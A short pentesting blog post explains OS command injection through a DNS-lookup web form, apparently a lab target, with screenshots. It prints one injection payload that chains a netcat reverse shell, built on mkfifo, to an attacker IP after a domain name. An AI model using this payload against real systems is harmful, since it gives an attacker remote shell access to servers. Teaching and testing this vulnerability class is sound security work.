---
layout: post
title: OS Command Injection
categories:
  - Web-Pentesting
---

<p>OS command injection is a technique used via a web interface in order to execute OS commands on a web server. The user supplies operating system commands through a web interface in order to execute OS commands. Any web interface that is not properly sanitized is subject to this exploit. With the ability to execute OS commands, the user can upload malicious programs or even obtain passwords. OS command injection is preventable when security is emphasized during the design and development of applications.</p>
<br>As you can see this is DNS lookup but, it has OS Command injection vulnerability using which we can execute system command.

![28.2](https://teckk2.github.io/assets/images/Web%20Pentest/A1/28.2.png)
![29.1](https://teckk2.github.io/assets/images/Web%20Pentest/A1/29.1.png)
![30.1](https://teckk2.github.io/assets/images/Web%20Pentest/A1/30.1.png)
<br>We can even get the reverse shell out of it.
![31.1](https://teckk2.github.io/assets/images/Web%20Pentest/A1/31.1.png)
<br><font color="Black">www.nsa.gov && rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.140.136 4455 >/tmp/f</font>
![32.1](https://teckk2.github.io/assets/images/Web%20Pentest/A1/32.1.png)

<p class="message">
  ~ Hack the World and Stay Noob
</p>

[Twitter](https://twitter.com/Teck__K2) / [Hack The Box](https://www.hackthebox.eu/profile/966) / [CTF Team](https://ctftime.org/team/20102) /
[Teck_N00bs Community Telegram](https://t.me/Teck_N00bs)

<script src="https://www.hackthebox.eu/badge/966"> </script>
